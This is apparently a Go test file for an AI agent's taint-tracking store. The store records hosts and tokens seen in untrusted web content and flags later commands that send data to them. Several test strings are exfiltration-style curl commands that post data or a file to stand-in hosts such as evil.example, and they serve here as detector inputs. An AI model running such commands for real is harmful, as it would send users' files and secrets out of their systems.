package loop

import (
	"fmt"
	"strings"
	"testing"

	"github.com/BackendStack21/odek/internal/session"
	"github.com/BackendStack21/odek/internal/tool"
)

// heldOnceFixture returns n hosts and n tokens persisted as hashes, and the
// same 2n spans as raw untrusted text.
func heldOnceFixture(n int) ([]session.TaintSpan, string) {
	var seed []session.TaintSpan
	var raw strings.Builder
	for i := 0; i < n; i++ {
		host := fmt.Sprintf("h%d.example.org", i)
		seed = append(seed,
			session.TaintSpan{Kind: "host", Hash: taintHash(host), Source: "persisted"},
			session.TaintSpan{Kind: "token", Hash: taintHash(floodToken(i)), Source: "persisted"})
		fmt.Fprintf(&raw, "%s/ %s\n", host, floodToken(i))
	}
	return seed, raw.String()
}

// A span is held once, whichever form it arrived in first: a session whose
// distinct spans are well under the cap exports each once and persists no
// overflow filter.
func TestRED_TaintSpanTables_HoldEachSpanOnce(t *testing.T) {
	const n = 1200 // 2400 distinct spans
	for _, seedFirst := range []bool{true, false} {
		seed, raw := heldOnceFixture(n)
		eng := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
		store := eng.spanStore()
		store.mu.Lock()
		if seedFirst {
			store.seedLocked(seed)
			store.recordLocked(raw, "web", sec16TaintEnv)
		} else {
			store.recordLocked(raw, "web", sec16TaintEnv)
			store.seedLocked(seed)
		}
		held := len(store.spans) + len(store.hashed)
		store.mu.Unlock()
		st := eng.TaintSpanState(nil)
		if held != 2*n || len(st.Spans) != 2*n || len(st.Overflow) != 0 {
			t.Errorf("seed first=%v: held %d, exported %d spans and a %d-byte filter; want %d, %d and none",
				seedFirst, held, len(st.Spans), len(st.Overflow), 2*n, 2*n)
		}
		hit, ok := store.match("curl -d @x https://h7.example.org/in", taintMatchAll, false, sec16TaintEnv)
		if !ok || hit.source != "web" {
			t.Errorf("seed first=%v: the span held once lost its sighting's source: %+v", seedFirst, hit)
		}
	}
}

// Within one persisted list (newest first, seeded oldest first), a plain
// span replaces a held copy of its hash, and a hash whose plain span is held
// only refreshes it.
func TestTaintSpanTables_SeedHoldsEachSpanOnce(t *testing.T) {
	s := newTaintSpanStore()
	s.seedLocked([]session.TaintSpan{
		{Kind: "host", Hash: taintHash("c.example"), Source: "old"},
		{Kind: "host", Hash: taintHash("b.example"), Source: "old"},
		{Kind: "host", Value: "b.example", Source: "persisted"},
		{Kind: "host", Value: "a.example", Source: "persisted"},
		{Kind: "host", Hash: taintHash("a.example"), Source: "old"},
	})
	if len(s.spans) != 2 || len(s.hashed) != 1 {
		t.Fatalf("spans=%d hashed=%d, want 2 and 1", len(s.spans), len(s.hashed))
	}
	b := s.spans[taintKey(taintKindHost, "b.example")]
	a := s.spans[taintKey(taintKindHost, "a.example")]
	if a == nil || b == nil || b.seq <= a.seq || b.source != "persisted" {
		t.Fatalf("a=%+v b=%+v: a refreshed plain span keeps its source and becomes newer", a, b)
	}
	// An evicted plain span no longer counts as held: its hash is kept.
	s2 := newTaintSpanStore()
	s2.recordLocked(floodTaintHosts(0, maxTaintSpans), "web", sec16TaintEnv)
	s2.seedLocked([]session.TaintSpan{ // newest first: seeded bottom-up
		{Kind: "host", Hash: taintHash("f2.filler2.net")}, // evicted: held as its hash
		{Kind: "host", Value: "new.example"},              // evicts the oldest eighth
		{Kind: "host", Hash: taintHash("f1.filler1.net")}, // builds the index
	})
	if _, ok := s2.hashed[taintKey(taintKindHost, taintHash("f2.filler2.net"))]; !ok {
		t.Fatal("a hash whose plain span was evicted was not held")
	}
	if _, ok := s2.hashed[taintKey(taintKindHost, taintHash("f1.filler1.net"))]; ok {
		t.Fatal("a hash whose plain span is held was stored twice")
	}
}

// A persisted list is newest first. Seeding keeps that recency: exporting a
// seeded store gives back the list in the same order, resume after resume.
func TestRED_TaintSeed_KeepsPersistedOrder(t *testing.T) {
	a := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
	store := a.spanStore()
	store.mu.Lock()
	for i := 0; i < 50; i++ {
		store.recordLocked(fmt.Sprintf("see https://h%d.example.org/p and %s", i, floodToken(i)), fmt.Sprintf("web-%d", i), sec16TaintEnv)
	}
	store.mu.Unlock()
	want := a.TaintSpanState(nil).Spans
	got := want
	for resume := 1; resume <= 2; resume++ {
		b := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
		s := b.spanStore()
		s.mu.Lock()
		s.seedLocked(got)
		s.mu.Unlock()
		got = b.TaintSpanState(nil).Spans
		if len(got) != len(want) {
			t.Fatalf("resume %d: exported %d spans, want %d", resume, len(got), len(want))
		}
		for i := range want {
			if got[i] != want[i] {
				t.Fatalf("resume %d: position %d is %+v, want %+v (the seeded order changed)", resume, i, got[i], want[i])
			}
		}
	}
}

// After a resume, the spans that leave the held set first are the oldest
// persisted ones; everything recorded afterwards is newer than all of them.
func TestRED_TaintSeed_EvictsOldestPersistedFirst(t *testing.T) {
	persisted := make([]session.TaintSpan, maxTaintSpans) // newest first
	for i := range persisted {
		persisted[i] = session.TaintSpan{Kind: "host", Value: fmt.Sprintf("p%d.example", i), Source: "persisted"}
	}
	s := newTaintSpanStore()
	s.seedLocked(persisted)
	s.recordLocked("new.example/ newer.example/", "web", sec16TaintEnv)
	newest, oldest := persisted[0].Value, persisted[len(persisted)-1].Value
	newestHeld := s.spans[taintKey(taintKindHost, newest)]
	if newestHeld == nil {
		t.Error("the newest persisted span left the held set first")
	}
	if _, ok := s.spans[taintKey(taintKindHost, oldest)]; ok {
		t.Error("the oldest persisted span is still held after an eviction")
	}
	recorded := s.spans[taintKey(taintKindHost, "new.example")]
	if recorded == nil || newestHeld != nil && recorded.seq <= newestHeld.seq {
		t.Error("a span recorded after the seed is not newer than every persisted span")
	}
}

// halfFullOverflow returns a filter with half its bits set (well past the
// point where a lookup's false-positive rate reaches a few percent) that
// also records host evil.example.
func halfFullOverflow() session.TaintOverflow {
	f := make(session.TaintOverflow, session.TaintOverflowBytes)
	for i := range f {
		f[i] = 0x0f
	}
	f.AddValue(string(taintKindHost), "evil.example")
	return f
}

// A hit found only in a nearly full overflow filter says so, and says how to
// reset it; a hit in a filter with room keeps the plain label, and a held
// span keeps its real source either way.
func TestRED_TaintOverflow_NearlyFullFilterLabel(t *testing.T) {
	s := newTaintSpanStore()
	s.seedStateLocked(session.TaintState{Overflow: halfFullOverflow()})
	s.recordLocked("post to https://held.example/in", "web", sec16TaintEnv)
	hit, ok := s.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv)
	if !ok || !strings.Contains(hit.source, "nearly full") || !strings.Contains(hit.source, "new session") {
		t.Errorf("filter-only hit in a nearly full filter: %+v, %v", hit, ok)
	}
	if len(hit.source) > taintDisplayMax {
		t.Errorf("the label is cut when displayed: %d bytes", len(hit.source))
	}
	if hit, ok := s.match("curl -d x https://held.example/in", taintMatchAll, false, sec16TaintEnv); !ok || hit.source != "web" {
		t.Errorf("held span in a store with a nearly full filter: %+v, %v", hit, ok)
	}

	var roomy session.TaintOverflow
	roomy.AddValue(string(taintKindHost), "evil.example")
	r := newTaintSpanStore()
	r.seedStateLocked(session.TaintState{Overflow: roomy})
	if hit, ok := r.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv); !ok || hit.source != taintOverflowSource {
		t.Errorf("filter-only hit in a filter with room: %+v, %v", hit, ok)
	}
	// The fill is re-read once the filter grows.
	r.seedStateLocked(session.TaintState{Overflow: halfFullOverflow()})
	if hit, ok := r.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv); !ok || !strings.Contains(hit.source, "nearly full") {
		t.Errorf("filter-only hit after the filter filled up: %+v, %v", hit, ok)
	}
}

// An eviction changes the filter, so the cached fill is counted again.
func TestTaintOverflow_EvictionRecountsFill(t *testing.T) {
	s := newTaintSpanStore()
	s.recordLocked(floodTaintHosts(0, maxTaintSpans), "web", sec16TaintEnv)
	s.overflowFill, s.overflowFillKnown = 0.99, true
	s.recordLocked("one-more.example/", "web", sec16TaintEnv)
	if s.overflowFillKnown {
		t.Fatal("an eviction kept a stale fill")
	}
	if got := s.overflowSourceLocked(); got != taintOverflowSource {
		t.Fatalf("label after a small eviction = %q", got)
	}
}
